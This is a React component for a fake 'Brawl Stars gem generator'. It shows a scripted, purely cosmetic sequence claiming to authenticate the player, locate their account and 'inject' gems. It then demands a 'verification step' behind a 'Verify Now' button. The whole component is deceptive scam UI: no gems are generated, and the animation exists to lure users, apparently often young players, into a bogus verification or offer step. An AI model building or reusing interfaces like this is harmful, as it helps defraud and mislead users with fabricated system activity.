import React, { useState, useEffect } from 'react';

interface OfferModalProps {
  isOpen: boolean;
  onClose: () => void;
  gemAmount: number | null;
  playerName: string;
}

const steps = [
    "Initializing connection...",
    "Authenticating user: ",
    "Locating Brawl Stars account...",
    "Injecting ",
    "Finalizing process...",
    "Verification Required"
];

const OfferModal: React.FC<OfferModalProps> = ({ isOpen, onClose, gemAmount, playerName }) => {
    const [currentStep, setCurrentStep] = useState(0);

    useEffect(() => {
        if (isOpen) {
            setCurrentStep(0);
            const interval = setInterval(() => {
                setCurrentStep(prevStep => {
                    if (prevStep >= steps.length - 1) {
                        clearInterval(interval);
                        return prevStep;
                    }
                    return prevStep + 1;
                });
            }, 1200);

            return () => clearInterval(interval);
        }
    }, [isOpen]);

    if (!isOpen) {
        return null;
    }

    const getStepText = (stepIndex: number) => {
        let text = steps[stepIndex];
        if (stepIndex === 1) text += playerName;
        if (stepIndex === 3) text += `${gemAmount?.toLocaleString()} Gems...`;
        return text;
    };
    
    return (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={onClose}>
            <div className="bg-gradient-to-b from-slate-800 to-slate-900 rounded-2xl border-2 border-cyan-500 shadow-2xl shadow-cyan-500/20 w-full max-w-md text-white p-6 relative" onClick={(e) => e.stopPropagation()}>
                <button onClick={onClose} className="absolute top-3 right-3 text-slate-400 hover:text-white transition-colors">&times;</button>
                <h2 className="text-2xl font-bold text-center mb-4 font-lilita text-cyan-300">Generating Gems</h2>

                <div className="bg-black/50 p-4 rounded-lg font-mono text-sm h-48 overflow-y-auto">
                    {steps.slice(0, currentStep + 1).map((_, index) => (
                         <div key={index} className="flex items-center mb-2 animate-fadeIn">
                             {index < currentStep ? (
                                 <span className="text-green-400 mr-2">✓</span>
                             ) : (
                                <div className="w-4 h-4 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin mr-2"></div>
                             )}
                            <p>{getStepText(index)}</p>
                         </div>
                    ))}
                </div>

                {currentStep === steps.length - 1 && (
                     <div className="mt-6 text-center animate-fadeIn">
                        <p className="mb-4 text-slate-300">To prevent abuse, you must complete a short verification step.</p>
                        <button className="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-6 rounded-lg w-full transition-transform transform hover:scale-105 shadow-lg shadow-green-500/30">
                            Verify Now
                        </button>
                     </div>
                )}
            </div>
        </div>
    );
};

export default OfferModal;
